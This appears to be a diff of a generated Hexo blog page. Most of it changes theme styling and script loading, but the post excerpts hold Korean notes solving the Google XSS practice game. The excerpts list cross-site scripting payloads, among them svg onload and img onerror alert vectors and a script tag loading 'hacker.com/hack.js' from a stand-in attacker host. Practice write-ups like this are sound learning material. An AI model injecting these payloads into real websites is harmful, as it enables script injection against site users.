@@ -295,7 +295,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       <div id="l_cover">
   
     
-        <div id="full" class='cover-wrapper  focus' style="display: none;">
+        <div id="full" class='cover-wrapper  dock' style="display: none;">
           
             <div class='cover-bg lazyload placeholder' data-bg="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/051.jpg"></div>
           
@@ -371,7 +371,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     
   </div>
   
-    <div class='meta-v3' line_style='dotted'>
+    <div class='meta-v3' line_style='solid'>
       <div>
         
           
@@ -416,17 +416,18 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     
       
         홈페이지 : https://xss-game.appspot.com/
-1. LEVEL-11&lt;svg onload=alert(1)&gt;
+1. LEVEL-1&lt;svg onload=alert(1)&gt;
 
-2. LEVEL-21&lt;img src=&quot;#&quot; onerror=alert(1)&gt;
+2. LEVEL-2&lt;img src=&quot;#&quot; onerror=alert(1)&gt;
 onerror 이벤트 핸들러로 alert를 띄워줄 수 있다.
 
-3. LEVEL-312345678910111213...
+3. LEVEL-3    &lt;script&gt;
+...
       
     
   </div>
   
-    <div class='meta-v3' line_style='dotted'>
+    <div class='meta-v3' line_style='solid'>
       <div>
         
           
@@ -470,12 +471,16 @@ onerror 이벤트 핸들러로 alert를 띄워줄 수 있다.
   <div class='md'>
     
       
-        1234567891011121314151617&lt;script&gt;alert(1)&lt;/script&gt;&lt;Script&gt;alert(1)&lt;/Script&gt;&lt;svg onload=alert(1)&gt;&lt;img src=&quot;#&quot; onerror=alert(1)&gt;&lt;script src=&quot;hack...
+        &lt;script&gt;alert(1)&lt;/script&gt;
+&lt;Script&gt;alert(1)&lt;/Script&gt;
+&lt;svg onload=alert(1)&gt;
+&lt;img src=&quot;#&quot; onerror=alert(1)&gt;
+&lt;script src=&quot;hacker.com/hack.js&quot;&...
       
     
   </div>
   
-    <div class='meta-v3' line_style='dotted'>
+    <div class='meta-v3' line_style='solid'>
       <div>
         
           
@@ -805,7 +810,7 @@ var loadCSS = function( href, before, media, attributes ){
   loadCSS("https://cdn.jsdelivr.net/npm/node-waves@0.7.6/dist/waves.min.css", window.volantis.loadcss);
   
   
-  loadCSS("https://cdn.jsdelivr.net/npm/highlight.js@10.5.0/styles/atelier-cave-dark.css", window.volantis.loadcss);
+  loadCSS("https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@10/build/styles/solarized-light.min.css", window.volantis.loadcss);
   
 </script>
 <!-- required -->
@@ -884,7 +889,7 @@ var loadCSS = function( href, before, media, attributes ){
   function loadIssuesJS() {
     if ($(".md").find(".issues-api").length == 0) return;
 	
-	  loadScript('https://cdn.jsdelivr.net/npm/hexo-theme-volantis@4.3.0/source/js/issues.min.js');
+	  loadScript('/js/issues.js');
 	
   };
   $(function () {
@@ -1002,29 +1007,6 @@ var loadCSS = function( href, before, media, attributes ){
 
 
 
-   <script type="text/javascript">
-  loadScript("https://cdn.jsdelivr.net/npm/scrollreveal@4.0.6/dist/scrollreveal.min.js")
-  function pjax_scrollrebeal() {
-    ScrollReveal().reveal('.l_main .reveal', {
-      distance: '32px',
-      duration: '800',
-      interval: '20',
-      scale: '1',
-      easing: 'ease-out'
-    });
-  }
-  $(function () {
-  var checkScrollReveal = setInterval(function () {
-    if ($("#safearea").css("display")!="block") return
-    if (typeof ScrollReveal=="undefined") return
-    clearInterval(checkScrollReveal)
-	pjax_scrollrebeal();
-  }, 100)
-  });
-  volantis.pjax.push(pjax_scrollrebeal)
-</script>
-
-
 
 
 
@@ -1126,7 +1108,7 @@ var loadCSS = function( href, before, media, attributes ){
 
 
   
-<script src="https://cdn.jsdelivr.net/npm/hexo-theme-volantis@4.3.0/source/js/app.min.js"></script>
+<script src="/js/app.js"></script>
 
 
 
@@ -1138,7 +1120,7 @@ const ROOT =  ("/" || "/").endsWith('/') ? ("/" || "/") : ("//" || "/" );
 
 $('.input.u-search-input').one('focus',function(){
 	
-		loadScript('https://cdn.jsdelivr.net/npm/hexo-theme-volantis@4.3.0/source/js/search/hexo.min.js',setSearchService);
+		loadScript('/js/search/hexo.js',setSearchService);
 	
 })
 
